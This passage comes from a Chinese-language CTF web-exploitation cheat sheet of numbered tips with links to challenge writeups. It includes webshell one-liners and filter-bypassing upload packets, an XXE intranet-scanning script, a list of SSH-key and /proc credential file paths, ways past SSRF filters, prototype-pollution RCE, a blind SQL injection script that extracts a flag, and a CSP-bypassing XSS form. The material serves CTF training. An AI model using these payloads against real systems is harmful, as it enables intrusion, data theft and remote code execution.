/proc/sched_debug // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
/proc/mounts // 挂载的文件系统列表
/proc/net/arp //arp表，可以获得内网其他机器的地址
/proc/net/route //路由表信息
/proc/net/tcp and /proc/net/udp // 活动连接的信息
/proc/net/fib_trie // 路由缓存,可用于泄露内网网段
/proc/version // 内核版本
//以下文件若不知道PID，用self代替也可以
/proc/[PID]/cmdline // 可能包含有用的路径信息
/proc/[PID]/environ // 程序运行的环境变量信息，可以用来包含getshell。也有例如flask的题目会把SECRET KEY放里面
/proc/[PID]/cwd // 当前进程的工作目录
/proc/[PID]/fd/[#] // 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log
/proc/self/cmdline //获取当前启动进程的完整命令
/proc/self/mem   //进程的内存内容。注意该文件内容较多而且存在不可读写部分，直接读取会导致程序崩溃。需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。
/proc/self/maps  //当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/etc/ssh/sshd_config
/var/log/secure
/etc/sysconfig/network-scripts/ifcfg-eth0
/etc/syscomfig/network-scripts/ifcfg-eth1
/sys/class/net/eth0/address //eth0网卡的MAC地址
```

44. 基础[xxe](../../CTF/BUUCTF/Web/[NCTF2019]Fake%20XML%20cookbook.md)探测内网网段脚本。

题目及来源:[[NCTF2019]True XML cookbook](https://www.cnblogs.com/Article-kelp/p/16026652.html)

```python
import requests as res
url="http://9b0cf961-6439-461e-862f-882833e83736.node4.buuoj.cn:81/doLogin.php"
rawPayload='<?xml version="1.0"?>'\
         '<!DOCTYPE user ['\
         '<!ENTITY payload1 SYSTEM "http://10.244.80.{}">'\
         ']>'\
         '<user>'\
         '<username>'\
         '&payload1;'\
         '</username>'\
         '<password>'\
         '23'\
         '</password>'\
         '</user>'
for i in range(1,256):
    payload=rawPayload.format(i)
    #payload=rawPayload
    print(str("#{} =>").format(i),end='')
    try:
        resp=res.post(url,data=payload,timeout=0.3)
    except:
        continue
    else:
        print(resp.text,end='')
    finally:
        print('')
```

45. php phar反序列化漏洞。例题:[[CISCN2019 华北赛区 Day1 Web1]Dropbox](../../CTF/BUUCTF/Web/[CISCN2019%20华北赛区%20Day1%20Web1]Dropbox.md)
46. php文件上传一句话木马最基础绕过。在木马的开头加上GIF89a，上传文件时抓包改`Content-Type:`为图片。注意木马文件的`Content-Type:`改成什么都没事，重要的是后缀名。如果为了绕过过滤不得不改后缀名，就需要后续找别的漏洞把后缀改回来或者直接包含文件。

```php
GIF89a

<?php @eval($_POST['shell']);?>
````

包如下（仅截取上传部分）：

```
------WebKitFormBoundaryXSmMYBArrqu5ODCM
Content-Disposition: form-data; name="upload_file"; filename="shell.php" //这个名字很重要，保留php后缀名就能直接蚁剑连，否则需要找别的漏洞
Content-Type: image/png //改成png，能绕过过滤的都行

GIF89a

<?php @eval($_POST['shell']);?>

------WebKitFormBoundaryXSmMYBArrqu5ODCM
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryXSmMYBArrqu5ODCM--
```
最近找到了个更短的：
```php
<?=`$_GET[0]`?>
```
更多参考 https://github.com/bayufedra/Tiny-PHP-Webshell

47. sql注入如果没有过滤load_file，就能直接读取文件。例如：
- ',\`address\`=(select(load_file('/flag.txt')))#
可以直接在不爆表爆字段等任何信息的情况下直接读取到flag.txt文件。

48.  [linux proc/pid/信息说明](https://blog.csdn.net/shenhuxi_yu/article/details/79697792)。/proc/self/cmdline可以读取当前进程执行的命令，如果是python的网站可以借此读取到网站的文件名。linux中如果打开了一个文件且没有关闭的话，`/proc/pid/fd/文件描述符`  这个目录会包含了进程打开的每一个文件，比如/proc/pid/fd/3读取第一个打开的文件。在python里使用open打开的只要不close，都能猜文件描述符而读取到。例题:[[网鼎杯 2020 白虎组]PicDown](https://blog.csdn.net/wuyaowangchuan/article/details/114540227)
49. perl GET命令执行漏洞。例题:[[HITCON 2017]SSRFme](../../CTF/BUUCTF/Web/[HITCON%202017]SSRFme.md)
50. jwt可以通过将alg修改为none来实现无加密伪造。需要使用PyJWT第三方库。例题:[[HFCTF2020]EasyLogin](https://blog.csdn.net/qq_25500649/article/details/118597363)
51. [koa框架结构](https://www.cnblogs.com/wangjiahui/p/12660093.html)。
52. 无列名注入+布尔盲注。例题:[[GYCTF2020]Ezsqli](https://blog.csdn.net/qq_45521281/article/details/106647880)(里面最后一道例题)
53. sql多行二次注入+git目录泄漏+.DS_Store泄露。例题:[comment](../../CTF/攻防世界/7级/Web/comment.md)
54. sql注入中，空格能用内联注释符`/**/`或tab键代替，似乎`/*/`和`//`也可以；如果注释符`#`被过滤，可以用`;%00`替代，截断注释后面的内容。
55. regexp盲注。例题:[[NCTF2019]SQLi](https://blog.csdn.net/l2872253606/article/details/125265138)
56. [Arjun](https://github.com/s0md3v/Arjun) http参数爆破工具。
57. 使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个木马，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破并连接木马就可以getshell。来自[php文件操作trick](https://www.cnblogs.com/tr1ple/p/11301743.html)。更多参考[PHP临时文件机制](https://www.cnblogs.com/linuxsec/articles/11278477.html)。例题:[[NPUCTF2020]ezinclude](https://www.cnblogs.com/Article-kelp/p/14826360.html)
58. 在json中可以使用unicode编码进行转义。如下面两种写法都可以被正确解析。

```
{"poc":"php"}
{"poc":"\u0070\u0068\u0070"}
```

可用于绕过滤。

59. [file_get_contents("php://input")的用法](https://www.cnblogs.com/jiangxiaobo/p/10723031.html)
60. 字符直接和0xFF异或相当于取反。
61. 利用.htaccess文件上传漏洞时，注意php_value auto_append_file的路径可以写php伪协议，这样能用于绕过某些过滤。比如程序过滤了`<?`，我们能够把马base64编码，再上传带有`php_value auto_append_file "php://filter/convert.base64-decode/resource=xxx`的.htaccess文件就能正常使用马了。
62. php绕过exif_imagetype()检测+[open_basedir bypass](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)。例题:[[SUCTF 2019]EasyWeb](../../CTF/BUUCTF/Web/[SUCTF%202019]EasyWeb.md)
63. render_template_string处可能会有python的flask ssti。
64. sql注入逗号被过滤时的绕过[方法](https://www.jianshu.com/p/d10785d22db2)。
65. sql注入弱类型相加。例题:[[网鼎杯2018]Unfinish](https://blog.csdn.net/rfrder/article/details/109352385)
66. 由不安全的SessionId导致的[ThinkPHP6 任意文件操作漏洞](https://paper.seebug.org/1114/)。例题:[[GYCTF2020]EasyThinking](https://blog.csdn.net/mochu7777777/article/details/105160796)
67. php中xxx session内容会被存储到/runtime/session/sess_xxx中。session默认存储文件名是sess_+PHPSESSID
68. php的\$_SERVER['QUERY_STRING']不会对传入键值对进行url解码。
69. php中虽然\$_REQUEST同时接收GET和POST的传参，但POST拥有更高的优先级，当\$_GET和\$_POST中的键相同时，\$_POST的值将覆盖\$_GET的值。
70. php sha1加密数组绕过+extract变量覆盖漏洞+create_function代码注入。例题:[[BJDCTF2020]EzPHP](../../CTF/BUUCTF/Web/[BJDCTF2020]EzPHP.md)
71. 代码执行题可通过输入Error().stack测试后台代码是不是js。
72. js [vm2沙箱逃逸](https://www.anquanke.com/post/id/207291)。例题:[[HFCTF2020]JustEscape](https://blog.csdn.net/SopRomeo/article/details/108629520)
73. web爬虫计算脚本。

[例题及来源](https://blog.csdn.net/qq_46263951/article/details/118914287)

```python
import re
import requests
from time import sleep
def count():
    s = requests.session()
    url = 'http://4cf5d9ba-2df8-4b52-88ff-5fcbd27c5fc9.node4.buuoj.cn:81/'
    match = re.compile(r"[0-9]+ [+|-] [0-9]+")
    r = s.get(url)
    for i in range(1001):
        sleep(0.1)
        str = match.findall(r.text)[0]
        # print(eval(str))
        data = {"answer" : eval(str)}
        r = s.post(url, data=data)
        r.encoding = "utf-8"
        # print(r.text)
    print(r.text)
if __name__ == '__main__':
    count()
```

74. post上传题目fuzz脚本。

[例题及来源](https://blog.csdn.net/mochu7777777/article/details/107729445),这题还有个汉字取反getshell

```python
# -*- coding:utf-8 -*-
# Author: m0c1nu7
import requests

def ascii_str():
	str_list=[]
	for i in range(33,127):
		str_list.append(chr(i))
	#print('可显示字符：%s'%str_list)
	return str_list

def upload_post(url):
	str_list = ascii_str()
	for str in str_list:
		header = {
		'Host':'3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn',
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
		'Accept-Encoding':'gzip, deflate',
		'Content-Type':'multipart/form-data; boundary=---------------------------339469688437537919752303518127'
		}
		post = '''-----------------------------339469688437537919752303518127
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

12345'''+str+'''
-----------------------------339469688437537919752303518127
Content-Disposition: form-data; name="submit"

提交			
-----------------------------339469688437537919752303518127--'''

		res = requests.post(url,data=post.encode('UTF-8'),headers=header)
		if 'Stored' in res.text:
			print("该字符可以通过:  {0}".format(str))
		else:
			print("过滤字符:  {0}".format(str))
			


if __name__ == '__main__':
	url = 'http://3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn/index.php?act=upload'
	upload_post(url)
```

75. union select跨库查询+sqlmap的基本使用。例题:[[b01lers2020]Life on Mars](https://blog.csdn.net/mochu7777777/article/details/107725530)
76. 当上传xml遇到waf时，在没有任何提示的情况下，可以尝试将UTF-8编码转为UTF-16编码绕过。
- iconv -f utf8 -t utf-16 1.xml > 2.xml
77. ruby ERB模板注入+预定义变量。例题:[[SCTF2019]Flag Shop](../../CTF/BUUCTF/Web/[SCTF2019]Flag%20Shop.md)
78. php require_once绕过。例题:[[WMCTF2020]Make PHP Great Again](https://www.anquanke.com/post/id/213235)
79. 巧用函数嵌套绕过滤读文件（利用scandir配合next，current等函数取出文件名）。例题:[[GXYCTF2019]禁止套娃](../../CTF/BUUCTF/Web/[GXYCTF2019]禁止套娃.md)
80. php finfo_file()函数仅识别PNG文件十六进制下的第一行信息，即文件头信息。而getimagesize()函数则会检测更多东西：

```
索引 0 给出的是图像宽度的像素值
索引 1 给出的是图像高度的像素值
索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM
索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签
索引 bits 给出的是图像的每种颜色的位数，二进制格式
索引 channels 给出的是图像的通道值，RGB 图像默认是 3
索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如：header("Content-type: image/jpeg");
```

例题及来源:[[HarekazeCTF2019]Avatar Uploader 1](https://blog.csdn.net/weixin_44037296/article/details/112604812)

81. php使用内置类Exception 和 Error绕过md5和sha1函数。例题:[[极客大挑战 2020]Greatphp](https://blog.csdn.net/LYJ20010728/article/details/117429054)
82. php [parse_url解析漏洞](https://www.cnblogs.com/tr1ple/p/11137159.html)。再给出一个比较简短的[参考](https://blog.csdn.net/q1352483315/article/details/89672426)。例题:[[N1CTF 2018]eating_cms](https://blog.csdn.net/mochu7777777/article/details/105337682),这题还有个文件名命令注入。该题的关键点在于伪协议读取源码，但关键文件名被过滤。url经过parse_url过滤，所以构造`//user.php?page=php://filter/convert.base64-encode/resource=upllloadddd.php`来绕过过滤。注意题目的php版本是5.5.9，现在7+版本运行结果会不一样。

```php
<?php
$url6 = "//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg";
$keywords = ["flag","manage","ffffllllaaaaggg","info"];
$uri=parse_url($url6);
var_dump($uri);
parse_str($uri['query'], $query);
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                echo 'no1';
            if (stristr($v, $token))
                echo 'no2';
        }
    }
'''
7+
array(2) {
  ["host"]=>
  string(8) "user.php"
  ["query"]=>
  string(64) "page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg"
}
no2
'''

'''
5.5.9
array(2) {
  ["host"]=>
  string(17) "user.php?page=php"
  ["path"]=>
  string(55) "//filter/convert.base64-encode/resource=ffffllllaaaaggg"
}
'''
```

发现7+版本解析正常，而5.5.9版本把url的query解析成了path，自然就能绕过过滤了。同时，多加一条斜线不会影响apache解析路径。

83. sqlmap使用[参考](https://www.freebuf.com/sectool/164608.html)。
84. php引用赋值。例题:[BUU CODE REVIEW 1](https://blog.csdn.net/qq_45555226/article/details/110003144)
85. 伪造内网ip的几种方式。

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Host: localhost
X-Client-IP: 127.0.0.1
X-Forwared-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Real-ip: 127.0.0.1
X-rewrite-url: secret.php //这个是bypass 403
```

1.  [使用curl发送post请求](https://blog.csdn.net/m0_37886429/article/details/104399554)。
2.  [存储型xss](https://www.ddddy.icu/2022/03/31/%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/)。
3.  linux下，/proc/self/pwd/代表当前路径。
4.  php session反序列化漏洞+SoapClient CRLF注入+SSRF。例题:[bestphp's revenge](../../CTF/BUUCTF/Web/bestphp's%20revenge.md)
5.  call_user_func()函数如果传入的参数是array类型的话，会将数组的成员当做类名和方法。
6.  js原型链污染导致的命令执行。例题:[[GYCTF2020]Ez_Express](../../CTF/BUUCTF/Web/[GYCTF2020]Ez_Express.md)。不仅仅是merge、clone函数会导致原型链污染，同样是express带有的[undefsafe](https://security.snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940)函数也会引发此漏洞。例题:[[网鼎杯 2020 青龙组]notes](https://blog.csdn.net/qq_45708109/article/details/108233667)
7.  js大小写特性
- 对于toUpperCase():
> 字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"
- 对于toLowerCase():
> 字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)
1.  基础存储型xss获取管理员cookie。例题:[BUU XSS COURSE 1](https://www.cnblogs.com/rabbittt/p/13372401.html)
2.  sql堆叠注入+预处理语句。例题:[supersqli](../../CTF/攻防世界/2级/Web/supersqli.md)
3.  [MySQL注入 利用系统读、写文件](https://www.cnblogs.com/mysticbinary/p/14403017.html)
4.  sql堆叠注入+预处理注入写入shell+[char函数](https://blog.csdn.net/asli33/article/details/7090717)绕过过滤。例题:[[SUCTF 2018]MultiSQL](https://blog.csdn.net/mochu7777777/article/details/105230001)
5.  [nginx配置错误导致的目录穿越漏洞](https://blog.csdn.net/haoren_xhf/article/details/107367766)。
6.  python存储对象的位置在堆上，因此可以利用/proc/self/maps+/proc/self/mem读取到SECRET_KEY。例题:[catcat-new](../../CTF/攻防世界/2级/Web/catcat-new.md)
7.  [.htaccess的使用技巧](https://blog.csdn.net/solitudi/article/details/116666720)
8.   [php利用伪协议绕过exit](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)。例题:[[EIS 2019]EzPOP](https://blog.csdn.net/TM_1024/article/details/116208390)
9.   php中使用create_function()创建的函数命名规律遵循：%00lambda_%d，其中%d是持续递增的。例题:[[SUCTF 2018]annonymous](https://blog.csdn.net/mochu7777777/article/details/105225558)
10.  [SSRF漏洞利用方式](https://www.anquanke.com/post/id/239994)
11.  thinkphp默认上传路径是/home/index/upload
12.  php中不同的序列化引擎所对应的session的存储方式不相同。

```
php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
php:存储方式是，键名+竖线+经过serialize()函数序列处理的值
php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值
```

Ubuntu默认安装的PHP中session.serialize_handler默认设置为php。

105. [利用本地DTD文件的xxe](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)。例题:[[GoogleCTF2019 Quals]Bnv](https://syunaht.com/p/1267717976.html)。
106. [xpath注入](https://www.cnblogs.com/backlion/p/8554749.html)。例题:[[NPUCTF2020]ezlogin](https://tyaoo.github.io/2020/05/26/BUUCTF-2/)
107. express的parameterLimit默认为1000;根据rfc，header字段可以通过在每一行前面至少加一个SP或HT来扩展到多行。例题:[ez_curl](../../CTF/攻防世界/4级/Web/ez_curl.md)
108. java WEB-INF目录泄露+任意文件读取。例题:[[RoarCTF 2019]Easy Java](../../CTF/BUUCTF/Web/[RoarCTF%202019]Easy%20Java.md)
109. 调用shell执行代码时，被反引号扩起来的内容会先执行，以此可用于绕过一些固定的格式。比如写入的system语句会被包装成json这种情况就可用反引号绕过。例题:[[2020 新春红包题]1](https://www.zhaoj.in/read-6397.html)
110. 如果当前的权限不够，想用已知有权限的账号cat flag，可用：

- printf "GWHTCTF" | su - GWHT -c 'cat /GWHT/system/of/a/down/flag.txt'

这里的账号名为GWHT，密码为GWHTCTF。

111. curl发送自定义数据包（PUT方法，origin，-u选项等）。例题:[[BSidesCF 2020]Hurdles](https://blog.csdn.net/weixin_44037296/article/details/112298411)
112. thinkphp V6.0.x 反序列化链利用。例题:[[安洵杯 2019]iamthinking](https://xz.aliyun.com/t/9546)
113. php hash_hamc函数绕过。`hash_hmac($algo, $data, $key)`：当传入的data为数组时，加密得到的结果固定为NULL。例题:[[羊城杯 2020]Blackcat](https://blog.csdn.net/qq_46263951/article/details/119796671)
114. node js 8.12.0版本的[拆分攻击（CRLF）可造成SSRF](https://xz.aliyun.com/t/2894)+pug模板引擎命令执行。例题:[[GYCTF2020]Node Game](https://blog.csdn.net/cjdgg/article/details/119068329)
115. php7.4的FFI扩展安全问题以及利用（绕过disabled functions）。例题:[[RCTF 2019]Nextphp](https://blog.csdn.net/RABCDXB/article/details/120319633)
116. perl 文件上传+ARGV的利用。例题:[i-got-id-200](../../CTF/攻防世界/6级/Web/i-got-id-200.md)
117. unzip中[软链接](https://blog.csdn.net/weixin_44966641/article/details/119915004)的利用。ln -s是Linux的一种软连接,类似与windows的快捷方式。可以利用压缩了软链接的zip包[任意读取文件](https://xz.aliyun.com/t/2589)。例题:[[SWPU2019]Web3](https://blog.csdn.net/mochu7777777/article/details/105666388)
118. 特殊的flask cookie伪造。与一般的不同，使用get_signing_serializer。

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
app = Flask(__name__)
app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
def index():
    print(session_serializer.dumps("admin"))
index()
#ImFkbWluIg.Y9WDSA.AbIYU50Boq_syWcomulegtw9fnc
```

例题:[[FBCTF2019]Event](https://blog.csdn.net/mochu7777777/article/details/107653920)

119. python利用type函数[动态创建类](http://c.biancheng.net/view/2292.html)。
120. python路径拼接os.path.join()函数当其中一个参数为绝对路径时，前面的参数会被舍弃，利用这个特点可以绕过一些路径限制。例题:[[HFCTF 2021 Final]easyflask](https://blog.csdn.net/LYJ20010728/article/details/117422046)
121. 一段数据以rO0AB开头，基本可以确定这串就是Java序列化base64加密的数据;如果以aced开头，那么是一段Java序列化的16进制。
122. java [JDBCsql注入](https://www.wangan.com/docs/94)+burpsuite java Deserialization Scanner插件+ysoserial（java反序列化漏洞工具）。例题:[[网鼎杯 2020 朱雀组]Think Java](https://blog.csdn.net/RABCDXB/article/details/124003575)
123. 在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个设置叫[session.upload_progress.enabled](https://xz.aliyun.com/t/9545)，默认为On，在这个选项被打开后，在multipart POST时传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()。借此可以绕过一些需要session才能访问的文件的限制，甚至RCE。例题:[[PwnThyBytes 2019]Baby_SQL](https://blog.csdn.net/SopRomeo/article/details/108967248)。
124. node.js早期版本（<8.0)中，沙箱vm2有个特性：当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。一个调用过的变量，一定会存在内存中，也就是说，我们可以使用Buffer函数读取沙箱之外的变量内容，实现沙箱逃逸。例题:[[HITCON 2016]Leaking](https://blog.csdn.net/weixin_44037296/article/details/112387663)
125. 对于SSRF，127.0.0.1无法使用的情况下，可以考虑0.0.0.0。
126. [[网鼎杯 2020 玄武组]SSRFMe](https://liotree.github.io/2020/07/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/)
- [redis](https://blog.csdn.net/like98k/article/details/106417214) [主从复制](https://www.cnblogs.com/karsa/p/14123957.html) [SSRF](https://xz.aliyun.com/t/5665)（RCE）。主要利用[Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)和[redis-ssrf](https://github.com/xmsec/redis-ssrf)两个工具。
- 绕过ssrf内网ip检测(php libcurl相关)。
  - 利用0.0.0.0:`http://0.0.0.0/`
  - 利用curl和其他库解析url的差异性(已在curl的较新版本被修复)：`http://foo@127.0.0.1:80@www.google.com/` ，https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
  - `http://127.1/hint.php`:ip2long('127.1')会返回false,不过gethostbyname在linux下会返回127.0.0.1，无法绕过。windows下的gethostbyname倒是会返回127.1，可以绕过
  - ip进制绕过。`?url=gopher://0177.0.0x0001:80/_%2547%2545%2554%2520%252f%2568...`
  - `http://127。0。0。1/`：有些curl版本可以
  - ipv6，需要环境支持ipv6
    ```
    http://[::1]/ >>> http://127.0.0.1/
    http://[::]/  >>>  http://0.0.0.0/
    ```
  - `http:///127.0.0.1/`:并不是只有浏览器才会解析这样host为空的畸形url，curl和git也会按照浏览器的方式解析。单纯curl不行，但是php的lib curl行。parse_url解析这样的畸形url会返回false，`$hostname=$url_parse['host'];`会返回null。最后，windows下`gethostbyname(null);`会返回本机ip，导致后面无法绕过ip检测。然而linux下并没有这样的特性，gethostbyname会返回null，绕过ip检测
127. [[NPUCTF2020]验证🐎](https://blog.csdn.net/hiahiachang/article/details/105756697)。本题的知识点有：
- js中列表，对象等与字符串相加会导致强制类型转换，结果为字符串。可用这个特点绕过一些md5加盐。以及，绕过md5时如果程序启用了json，可以利用json构造对象绕过大部分限制。
- js利用__proto__可从原型链上引出Function和String，Function用于构造函数，String用于得到fromCharCode绕过强制过滤。利用`process.mainModule.require('child_process').execSync('cat /flag')`进行rce，同时还利用了箭头函数。
128. 可以使用以下内容来绕过php的getmagesize()函数获得的图片长宽。
```
#define width 1
#define height 1
```

放头部和末尾都可以。

129. php的mb_strtolower()函数可用于绕过一些过滤。

```php
<?php
var_dump(mb_strtolower('İ')==='i');
//true
?>
```

130. 可绕过php getmagesize()函数的图片马生成[工具](https://github.com/huntergregal/PNG-IDAT-Payload-Generator)。例题:[[CISCN2021 Quals]upload](https://blog.csdn.net/jiangdie666/article/details/116997461)
131. 网页版post上传文件代码。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://faebbc7b-35b5-4792-8b8a-9af1ec7fc48f.node3.buuoj.cn/upload.php?ctf=upload" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="postedFile" id="postedFile"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

132. [MongoDB](https://zhuanlan.zhihu.com/p/87722764) sql注入。和普通sql注入相似，只是MongoDB还支持js语法，所以有的时候可以直接用js报错爆出字段值。例题:[[2021祥云杯]Package Manager 2021](https://blog.csdn.net/RABCDXB/article/details/124810618)
133. 在正则匹配的时候，如果没有用^$匹配头部或者尾部，就会存在简单的绕过。比如下面的正则：

```js
const checkmd5Regex = (token: string) => {
  return /([a-f\d]{32}|[A-F\d]{32})/.exec(token);
}
```

只需要在想填的值前面加上32个任意字符即可绕过。

134. 下面这段代码：

```php
if($count[]=1)
```

表示给\$count[]数组末尾添加一个1，如果添加成功返回1，否则0。这个可以用php的整形溢出绕过。如果数组里已有9223372036854775807个元素，末尾再增添元素就会整形溢出，导致返回false。此为“使用数组整型溢出绕过赋值式“永真”判断”。

135. 攻击 [php-fpm](https://tttang.com/archive/1775/) /pfsockopen绕过 disable_functions+[SUID提权](https://tttang.com/archive/1793/#toc_find-exec)。例题:[[蓝帽杯 2021]One Pointer PHP](https://blog.csdn.net/cosmoslin/article/details/121332240)
136. [利用pearcmd.php从LFI到getshell](https://blog.csdn.net/rfrder/article/details/121042290)。例题:[[HXBCTF 2021]easywill](https://cn-sec.com/archives/1478076.html)。提供p神的另一篇[文章](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)。
137. sql注入利用hex绕过过滤+利用位运算判断flag16进制长度+利用[replace](https://blog.csdn.net/bingguang1993/article/details/80592579)和[case-when-then](https://zhuanlan.zhihu.com/p/165423831)盲注。这题的思路很巧妙，首先是位运算算flag长度：`假设flag的长度为 x,而y 表示 2 的 n 次方,那么 x&y 就能表现出x二进制为1的位置,将这些 y 再进行或运算就可以得到完整的 x 的二进制,也就得到了 flag 的长度`。然后是构造报错语句实现盲注：`在sqlite3中,abs函数有一个整数溢出的报错,如果abs的参数是-9223372036854775808就会报错,同样如果是正数也会报错`。又因为引号被过滤，无法直接输入a，b这类16进制数字，靠trim数据库里已有的数据的16进制来得到所有的16进制字符，最后更是利用abs的性质报错实现盲注。

```python
# coding: utf-8
import binascii
import requests
URL = 'http://85ede6a8-f6ba-463f-996d-499f800d6cf0.node4.buuoj.cn:81/vote.php'
l = 0
i = 0
for j in range(16):
  r = requests.post(URL, data={
    'id': f'abs(case(length(hex((select(flag)from(flag))))&{1<<j})when(0)then(0)else(0x8000000000000000)end)'
  })
  if b'An error occurred' in r.content:
    l |= 1 << j
print('[+] length:', l)
table = {}
table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'
table['C'] = 'trim(hex(typeof(.1)),12567)'
table['D'] = 'trim(hex(0xffffffffffffffff),123)'
table['E'] = 'trim(hex(0.1),1230)'
table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'
table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})'
res = binascii.hexlify(b'flag{').decode().upper()
for i in range(len(res), l):
  for x in '0123456789ABCDEF':
    t = '||'.join(c if c in '0123456789' else table[c] for c in res + x)
    r = requests.post(URL, data={
      'id': f'abs(case(replace(length(replace(hex((select(flag)from(flag))),{t},trim(0,0))),{l},trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'
    })
    if b'An error occurred' in r.content:
      res += x
      break
  print(f'[+] flag ({i}/{l}): {res}')
  i += 1
print('[+] flag:', binascii.unhexlify(res).decode())
```

题目:[[HarekazeCTF2019]Sqlite Voting](https://blog.csdn.net/qq_46263951/article/details/119727922)

138. [uuid v1](https://versprite.com/blog/universally-unique-identifiers/)是可以预测的,因此用v1版本的uuid做身份认证有被爆破预测uuid的风险。在js里，node ID和clock sequence如下给出：

```js
var adminuuid = uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
//node=0x67696e6b6f69
//clockseq=0b10101001100100=0x2a64,第一位会根据UUID variant变化
```

python里则是：

```python
UUIDv1 = str(uuid1(node=0x67696E6B6F69, clock_seq=0b10101001100100))
```

例题:[uuid hell](https://ctftime.org/writeup/36173)

139. Mercurial SCM .hg文件夹泄露。Mercurial SCM也有一个和git类似的库管理命令：hg。注意它在遇见特殊字符时会转义，但是转义符是"_"。意味着一个名字包含一个下划线的文件最终文件名里会有两个下划线。例题:[my-chemical-romance](https://ctftime.org/writeup/36174)
140. xss绕过[HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)和`default-src 'none'; script-src 'unsafe-inline'`[csp](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)设置。前者让我们无法document.cookie盗取admin cookie值，后者允许内嵌式js脚本，但不允许以任何形式加载文件，包括服务器自身的。意味着无法以任何常见的形式发送请求，比如常用的fetch。替代方式是以form的形式发送POST。

```html
<form method="post" id="theForm" action="/flag"></form> <!-- action填要访问的网址 -->
<script> 
    document.getElementById('theForm').submit();
</script>
```

如果要打开的目标网页会重定向，可以考虑在代码中加入打开另一个窗口的操作，使用setTimeout函数保持当前网页脚本的运行，在打开的窗口中获取到flag。例如:

```html
<form method="post" id="theForm" action="/flag" target='bruh'>
    <!-- Form body here -->
</form>
<script> 
    let w = window.open('','bruh');
    document.getElementById('theForm').submit();
    setTimeout(()=>{
